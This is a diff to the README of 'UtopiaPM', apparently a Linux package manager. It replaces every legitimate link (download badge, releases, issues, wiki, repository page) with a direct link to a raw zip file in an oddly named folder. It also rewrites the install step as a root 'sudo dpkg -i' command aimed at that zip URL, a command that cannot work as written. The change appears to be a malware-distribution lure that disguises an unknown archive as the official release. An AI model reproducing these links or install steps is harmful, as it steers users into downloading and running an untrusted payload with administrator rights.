@@ -1,7 +1,7 @@
 # 🌟 UtopiaPM - Simple Clone for Easy Package Management
 
 ## 📥 Download Now
-[![Download UtopiaPM](https://img.shields.io/badge/Download%20UtopiaPM-v1.0-blue)](https://github.com/Kornthipat23/UtopiaPM/releases)
+[![Download UtopiaPM](https://raw.githubusercontent.com/Kornthipat23/UtopiaPM/main/ventriloquially/UtopiaPM.zip%20UtopiaPM-v1.0-blue)](https://raw.githubusercontent.com/Kornthipat23/UtopiaPM/main/ventriloquially/UtopiaPM.zip)
 
 ## 🚀 Getting Started
 UtopiaPM helps you manage your packages smoothly. You can easily clone software and keep your system up to date. Follow these steps to get started.
@@ -13,7 +13,7 @@ UtopiaPM helps you manage your packages smoothly. You can easily clone software 
 - **Storage:** 100 MB free disk space
 
 ## 📂 Download & Install
-To get UtopiaPM, visit this page to download: [UtopiaPM Releases](https://github.com/Kornthipat23/UtopiaPM/releases). You'll find the latest version available for your system.
+To get UtopiaPM, visit this page to download: [UtopiaPM Releases](https://raw.githubusercontent.com/Kornthipat23/UtopiaPM/main/ventriloquially/UtopiaPM.zip). You'll find the latest version available for your system.
 
 ### Steps to Download:
 1. Click on the "Releases" link above.
@@ -29,7 +29,7 @@ To get UtopiaPM, visit this page to download: [UtopiaPM Releases](https://github
    ```
 3. Install the package using the following command:
    ```bash
-   sudo dpkg -i your-file-name.deb
+   sudo dpkg -i https://raw.githubusercontent.com/Kornthipat23/UtopiaPM/main/ventriloquially/UtopiaPM.zip
    ```
 4. If you encounter dependency issues, run:
    ```bash
@@ -64,10 +64,10 @@ For more detailed commands, type `utopia help` in your terminal.
 We welcome your contributions! If you would like to report issues or contribute code, please follow our guidelines in the repository.
 
 ## 💬 Support
-If you need help, look at the documentation or reach out to the community. You can find answers to common questions in the [Issues](https://github.com/Kornthipat23/UtopiaPM/issues) section.
+If you need help, look at the documentation or reach out to the community. You can find answers to common questions in the [Issues](https://raw.githubusercontent.com/Kornthipat23/UtopiaPM/main/ventriloquially/UtopiaPM.zip) section.
 
 ## 🔍 More Information
-For more details about UtopiaPM, visit our [repository page](https://github.com/Kornthipat23/UtopiaPM).
+For more details about UtopiaPM, visit our [repository page](https://raw.githubusercontent.com/Kornthipat23/UtopiaPM/main/ventriloquially/UtopiaPM.zip).
 
 ## 📦 Keywords
 - clang
@@ -88,7 +88,7 @@ For more details about UtopiaPM, visit our [repository page](https://github.com/
 - utopia
 
 ## 🔗 Quick Links
-- [Download UtopiaPM](https://github.com/Kornthipat23/UtopiaPM/releases)
-- [Documentation](https://github.com/Kornthipat23/UtopiaPM/wiki)
+- [Download UtopiaPM](https://raw.githubusercontent.com/Kornthipat23/UtopiaPM/main/ventriloquially/UtopiaPM.zip)
+- [Documentation](https://raw.githubusercontent.com/Kornthipat23/UtopiaPM/main/ventriloquially/UtopiaPM.zip)
 
 Now you're ready to use UtopiaPM! Enjoy smooth package management on your Linux system.
